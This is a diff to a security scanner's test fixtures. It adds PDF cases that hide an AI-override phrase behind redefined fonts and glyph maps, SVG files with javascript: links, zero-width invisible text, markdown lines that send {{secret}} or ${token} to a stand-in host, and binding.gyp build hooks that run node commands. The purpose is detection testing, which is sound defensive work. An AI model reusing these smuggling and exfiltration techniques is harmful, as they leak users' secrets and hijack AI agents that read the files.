@@ -11,6 +11,7 @@ import json
 import pickle
 import shutil
 import struct
+import tarfile
 import tempfile
 import urllib.parse
 import zipfile
@@ -23,11 +24,24 @@ from yara_gate.samples import (
     hex_outline_title_pdf,
     merged_pdf,
     mini_pe,
+    redefined_font_pdf,
+    redefined_map_pdf,
     shared_name_pdf,
 )
 from yara_gate.scanner import scan_file
 
 REPO = Path(__file__).resolve().parents[2]
+
+
+def _tgz(name: str, payload: bytes) -> bytes:
+    """A one-member gzip tar, as npm packs a package."""
+    output = io.BytesIO()
+    with tarfile.open(fileobj=output, mode="w:gz") as archive:
+        info = tarfile.TarInfo(name)
+        info.size = len(payload)
+        info.mtime = 0
+        archive.addfile(info, io.BytesIO(payload))
+    return output.getvalue()
 
 
 def _zip(name: str, payload: bytes) -> bytes:
@@ -462,14 +476,15 @@ def _overflow_cmap_cases() -> list[tuple[str, bytes, str | None]]:
 
 
 def font_reading_cases() -> list[tuple[str, bytes, str | None]]:
-    """A resource name that means more fonts than the text reader decodes each string with.
+    """A resource name that means a different font on each page, as in a merged file.
 
-    Each page's /F1 is its own font, as in a merged file, and only the last maps the glyph
-    ids to the phrase. Past four readings the rest are not decoded, so the scan reports
-    ``heuristic_pdf_text_unmapped``; before docs/verification/2026-11-07-pdf-font-readings.md
-    five fonts scanned clean. An overflowing bfrange gives its font a second, carried reading
-    ordered after every font's first, so two decoys and that font are four readings, and
-    three decoys and that font are five.
+    Only the last page's /F1 maps the glyph ids to the phrase. Each page's content stream is
+    read through its own page's fonts (docs/verification/2026-11-10-pdf-page-fonts.md), so the
+    phrase is found however many pages there are; before that, past four fonts the scan
+    reported ``heuristic_pdf_text_unmapped`` (docs/verification/2026-11-07-pdf-font-readings.md).
+    A content stream that every page draws can mean every page's /F1, so there the four-reading
+    cap still applies and is still reported. An overflowing bfrange gives its font a second,
+    carried reading ordered after every font's first.
     """
     hit = "agent_override_imperative"
     unmapped = "heuristic_pdf_text_unmapped"
@@ -482,21 +497,70 @@ def font_reading_cases() -> list[tuple[str, bytes, str | None]]:
     codes = [_bold(char) - 0xFFFF if char.isalpha() else ord(char) + 0x100 for char in _PDF_PHRASE]
     bold = b"BT /F1 12 Tf 72 700 Td " + _codes(codes) + b" Tj ET"
 
-    def behind(decoys: int) -> bytes:
+    def behind(decoys: int, *, shared: bool = False) -> bytes:
         # A decoy range ends below 0xFFFF - page, so it never overflows into a carried reading.
         decoy = _CMAP_HEAD + b"1 beginbfrange\n<0000> <FEFF> <%04X>\nendbfrange\nendcmap\n"
         return shared_name_pdf(
-            [(bold, decoy % page) for page in range(1, decoys + 1)] + [(bold, carried)]
+            [(bold, decoy % page) for page in range(1, decoys + 1)] + [(bold, carried)],
+            shared_stream=shared,
         )
 
     return [
         ("fonts-4-last.pdf", merged_pdf(_PDF_PHRASE, 4, 4), hit),
-        ("fonts-5-last.pdf", merged_pdf(_PDF_PHRASE, 5, 5), unmapped),
-        ("fonts-8-last.pdf", merged_pdf(_PDF_PHRASE, 8, 8), unmapped),
+        ("fonts-5-last.pdf", merged_pdf(_PDF_PHRASE, 5, 5), hit),
+        ("fonts-8-last.pdf", merged_pdf(_PDF_PHRASE, 8, 8), hit),
         ("fonts-4-plain.pdf", merged_pdf(benign, 4, 4), None),
-        ("fonts-5-plain.pdf", merged_pdf(benign, 5, 5), unmapped),
+        ("fonts-5-plain.pdf", merged_pdf(benign, 5, 5), None),
         ("fonts-2-carried.pdf", behind(2), hit),
-        ("fonts-3-carried.pdf", behind(3), unmapped),
+        ("fonts-3-carried.pdf", behind(3), hit),
+        ("fonts-4-shared-last.pdf", merged_pdf(_PDF_PHRASE, 4, 4, shared_stream=True), hit),
+        ("fonts-5-shared-last.pdf", merged_pdf(_PDF_PHRASE, 5, 5, shared_stream=True), unmapped),
+        ("fonts-3-shared-carried.pdf", behind(3, shared=True), unmapped),
+    ]
+
+
+def font_definition_cases() -> list[tuple[str, bytes, str | None]]:
+    """A font object, or its ToUnicode map, that the file defines more than once.
+
+    The page shows the phrase as glyph ids in /F1, object 6. One definition maps the ids to the
+    phrase and the others map each id a few printable characters along. A reader uses one
+    definition, and readers differ in which, so each gives a reading
+    (docs/verification/2026-11-10-pdf-font-definitions.md). Before that record the first
+    definition of the font and the last of the map were the only ones read, and the cases
+    marked "was clean" scanned clean. Past four distinct definitions the rest are not decoded,
+    which is reported as ``heuristic_pdf_text_unmapped``; the last and the first are read first.
+    """
+    hit = "agent_override_imperative"
+    unmapped = "heuristic_pdf_text_unmapped"
+    benign = "Release notes for the spring update."
+    five = [(0, 0), (0, 1), (0, 2), (0, 3), (0, 4)]
+    second = [(0, 1), (0, 0), (0, 2), (0, 3), (0, 4)]
+    return [
+        ("font-twice-first.pdf", redefined_font_pdf(_PDF_PHRASE, [(0, 0), (0, 3)]), hit),
+        # Was clean: an incremental update's later definition.
+        ("font-twice-last.pdf", redefined_font_pdf(_PDF_PHRASE, [(0, 3), (0, 0)]), hit),
+        # Was clean: ``6 1 obj`` holds the phrase map and the page says ``6 0 R``.
+        ("font-generation.pdf", redefined_font_pdf(_PDF_PHRASE, [(0, 3), (1, 0)]), hit),
+        # Was clean: the page says ``6 1 R``, and ``6 0 obj`` holds the phrase map.
+        (
+            "font-reference-generation.pdf",
+            redefined_font_pdf(_PDF_PHRASE, [(1, 3), (0, 0)], reference=1),
+            hit,
+        ),
+        # Was clean: a raw decoy, and the phrase map's font inside an object stream.
+        ("font-objstm-member.pdf", redefined_font_pdf(_PDF_PHRASE, [(0, 3)], member=0), hit),
+        # Was clean: the font is defined once and its map stream twice, the phrase map first.
+        ("font-map-twice-first.pdf", redefined_map_pdf(_PDF_PHRASE, [0, 3]), hit),
+        ("font-map-twice-last.pdf", redefined_map_pdf(_PDF_PHRASE, [3, 0]), hit),
+        # The last, the first, and the two before the last are decoded; the second is not.
+        ("font-five-first.pdf", redefined_font_pdf(_PDF_PHRASE, five), hit),
+        ("font-five-last.pdf", redefined_font_pdf(_PDF_PHRASE, five[::-1]), hit),
+        ("font-five-second.pdf", redefined_font_pdf(_PDF_PHRASE, second), unmapped),
+        ("font-twice-plain.pdf", redefined_font_pdf(benign, [(0, 3), (0, 0)]), None),
+        ("font-generation-plain.pdf", redefined_font_pdf(benign, [(0, 3), (1, 0)]), None),
+        ("font-map-twice-plain.pdf", redefined_map_pdf(benign, [3, 0]), None),
+        ("font-five-equal-plain.pdf", redefined_font_pdf(benign, [(0, 0)] * 5), None),
+        ("font-five-plain.pdf", redefined_font_pdf(benign, five), unmapped),
     ]
 
 
@@ -699,6 +763,7 @@ def cases() -> list[tuple[str, bytes, str | None]]:
         *pdf_text_cases(),
         *_overflow_cmap_cases(),
         *font_reading_cases(),
+        *font_definition_cases(),
         *_encoded_text_cases(),
         *hex_string_cases(),
         # A zipped checkout: the member's own name reaches the name-scoped rules.
@@ -899,6 +964,47 @@ def cases() -> list[tuple[str, bytes, str | None]]:
         ("rooted.bin", b'<?xml version="1.0"?>\n<svg><rect/></svg><script/>', "doc_svg_active"),
         ("prose.svg", b"<svg><desc>The onbegin and onerror attributes.</desc></svg>", None),
         ("foreign.svg", b"<svg><foreignObject></foreignObject></svg>", None),
+        # Scriptless active content: a javascript: link or animation target, or a foreignObject
+        # that embeds a page or a form.
+        (
+            "link-js.svg",
+            b'<svg><a xlink:href="javascript:alert(1)"><text>o</text></a></svg>',
+            "doc_svg_active_link",
+        ),
+        ("link-void.svg", b'<svg><a href="javascript:void(0);"><text>o</text></a></svg>', None),
+        (
+            "set-js.svg",
+            b'<svg><a><set attributeName="href" to="javascript:alert(1)"/><text>o</text></a></svg>',
+            "doc_svg_active_link",
+        ),
+        (
+            "foreign-form.svg",
+            b'<svg><foreignObject><form action="https://example.invalid/"></form>'
+            b"</foreignObject></svg>",
+            "doc_svg_active_link",
+        ),
+        (
+            "foreign-label.svg",
+            b"<svg><foreignObject><div><p>Start</p></div></foreignObject></svg>",
+            None,
+        ),
+        (
+            "svg-comment-link.html",
+            b"<html><svg><!-- label </svg> -->"
+            b'<a href="javascript:f()"><text>o</text></a></svg></html>',
+            "doc_svg_active_link",
+        ),
+        ("page-link.html", b'<html><a href="javascript:f()">x</a><svg><path/></svg></html>', None),
+        (
+            "embedded-link.zip",
+            _zip("icon.svg", b'<svg><a href="javascript:alert(1)"><text>o</text></a></svg>'),
+            "doc_svg_active_link",
+        ),
+        (
+            "run.txt",
+            ("Quarterly notes" + "\u200b\u200c" * 40 + " attached.\n").encode(),
+            "agent_invisible_run",
+        ),
         ("icon.svg", b'<svg><rect width="1" height="1"/></svg>', None),
         ("exfil.md", b"![](https://example.invalid/a.png?q={{secret}})\n", "agent_markdown_exfil"),
         ("link.md", b"[x](https://example.invalid/a?x=${token})\n", "agent_markdown_exfil"),
@@ -947,6 +1053,30 @@ def cases() -> list[tuple[str, bytes, str | None]]:
             "dev_python_pth_exec",
         ),
         ("_virtualenv.pth", b"import _virtualenv\n", None),
+        (
+            "binding.gyp",
+            b'{"targets":[{"sources":["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]}]}',
+            "dev_gyp_command_expansion",
+        ),
+        (
+            "inert-1.0.0.tgz",
+            _tgz(
+                "package/binding.gyp",
+                b'{"targets":[{"sources":["<!(node index.js >/dev/null; echo stub.c)"]}]}',
+            ),
+            "dev_gyp_command_expansion",
+        ),
+        (
+            "binding.gyp",
+            b'{"targets":[{"include_dirs":'
+            b'["<!(node -p \\"require(\'node-addon-api\').include_dir\\")"]}]}',
+            None,
+        ),
+        (
+            "build.json",
+            b'{"targets":[{"sources":["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]}]}',
+            None,
+        ),
         (
             "inert-1.0-py3-none-any.whl",
             _zip("inert_init.pth", b"import subprocess; subprocess.Popen(['true'])\n"),
